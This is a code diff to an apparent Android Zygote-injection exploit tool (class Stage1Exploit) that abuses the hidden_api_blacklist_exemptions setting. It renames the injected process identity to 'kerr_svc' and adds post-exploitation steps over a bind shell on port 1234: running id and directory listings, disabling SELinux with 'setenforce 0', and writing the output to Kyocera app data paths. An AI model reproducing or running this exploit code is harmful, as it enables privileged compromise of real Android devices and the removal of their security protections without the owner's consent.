@@ -179,8 +179,6 @@ class Stage1Exploit:
         else:
             raise ZygoteInjectionException("netcat binary was not found")
 
-   
-
     @staticmethod
     def generate_stage1_exploit(command: str, exploit_type: str) -> str:
         "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
@@ -193,8 +191,8 @@ class Stage1Exploit:
             "--setgid=1000",
             "--setgroups=3003",
             "--runtime-args",
-            "--nice-name=system",
-            "--seinfo=platform:system_app:complete",
+            "--nice-name=kerr_svc",
+            "--seinfo=platform:kerr_svc:complete",
             "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
@@ -226,10 +224,46 @@ class Stage1Exploit:
                     return True
         return False
 
+    def _execute_post_exploit_commands(self) -> None:
+        """
+        After stage1 success, connect to the bind shell and execute a series of commands.
+        stdout -> /data/data/jp.kyocera.kdfs (append)
+        stderr -> /data/data/jp.kyocera.kerr (append)
+        Errors are ignored but still attempted to be written.
+        """
+        commands = [
+            "cat /proc/self/status",
+            "id",
+            "setenforce 0",
+            "ls /dev",
+            "ls /data"
+        ]
+        # Build a single shell script that appends stdout/stderr to the respective files
+        # Use 'set +e' to ignore errors and continue execution
+        script_body = "set +e\n"
+        for cmd in commands:
+            script_body += f"{cmd} >> /data/data/jp.kyocera.kdfs 2>> /data/data/jp.kyocera.kerr\n"
+        # Execute the script via sh -c
+        full_command = f"sh -c '{script_body}'"
+
+        try:
+            # Connect to the forwarded port (localhost:1234)
+            with socket.create_connection(('127.0.0.1', 1234), timeout=10) as sock:
+                # Send the command, add a newline to trigger execution
+                sock.sendall((full_command + "\n").encode())
+                # Give some time for the commands to run; we don't need to read output
+                # because it's redirected to files. We just wait a moment and close.
+                time.sleep(3)
+        except Exception as e:
+            # If anything fails, print a warning but do not raise
+            print(f"Warning: post-exploit command execution failed: {e}")
+
     def exploit_stage1(self) -> bool:
         if self.is_port_open(1234):
             print("The exploit is already running!")
             self.device.forward("tcp:1234", "tcp:1234")
+            # Even if already running, we still run the post commands
+            self._execute_post_exploit_commands()
             return True
 
         # make sure the hidden_api_blacklist_exemptions variable is reset
@@ -271,6 +305,8 @@ class Stage1Exploit:
                 if self.is_port_open(1234):
                     self.device.forward("tcp:1234", "tcp:1234")
                     print("Stage 1 success!")
+                    # Execute post-exploit commands
+                    self._execute_post_exploit_commands()
                     return True
                 else:
                     raise ZygoteInjectionException(
